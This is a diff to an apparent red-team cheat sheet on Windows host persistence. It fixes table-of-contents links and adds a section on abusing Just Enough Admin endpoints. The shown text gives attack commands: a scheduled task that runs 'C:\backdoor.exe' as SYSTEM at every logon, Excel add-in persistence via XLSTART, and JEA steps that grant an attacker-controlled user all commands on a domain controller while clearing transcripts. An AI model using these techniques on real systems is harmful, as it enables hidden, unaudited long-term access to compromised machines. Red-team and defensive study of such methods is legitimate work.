@@ -1,10 +1,11 @@
 * [User land](#User-land)
-  * [Startup(#Startup)
-  * [Registery keys(#Registery keys)
-  * [LNK(#LNK)
-  * [Schtask(#sSchtasks)
+  * [Startup](#Startup)
+  * [Registery keys](#Registery keys)
+  * [LNK](#LNK)
+  * [Schtask](#sSchtasks)
 * [Elevated](#Elevated)
-  * [Schtasks(#Schtasks2)
+  * [Schtasks](#Schtasks2)
+  * [Just Enough Admin](#Just-Enough-Admin)
 
 ## Host Persistence
 ### Userland
@@ -55,9 +56,25 @@ SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powers
 - Create a new Excel document with a module containing the persistence mechanism. Save it as "Excel Add-in" inside ```%APPDATA%\Microsoft\Excel\XLSTART``` and it will be launched every tim the user opens MS Excel application.
 - https://labs.f-secure.com/archive/add-in-opportunities-for-office-persistence/
 
-### Elevated
-#### Schtasks2
+## Elevated
+### Schtasks2
 ```
 # Run task as system each time a user logs in
 schtasks /create /ru "NT AUTHORITY\SYSTEM" /rp "" /tn "NotEvil" /tr C:\backdoor.exe /sc onlogon
+```
+
+### Just Enough Admin
+- If we have admin privileges on a machine, we can create a JEA endpoint which allows all commands to a user we control.
+- With this capability, it is also possible to clear the transcripts for this endpoint. 
+
+#### Create a new JEA endpoint
+- https://github.com/samratashok/RACE
+
+```
+Set-JEAPermissions -ComputerName ops-dc -SamAccountName <USER> -Verbose
+```
+
+#### Connect to JEA endpoint
+```
+Enter-PSSession -ComputerName ops-dc -ConfigurationName microsoft.powershell64
 ```
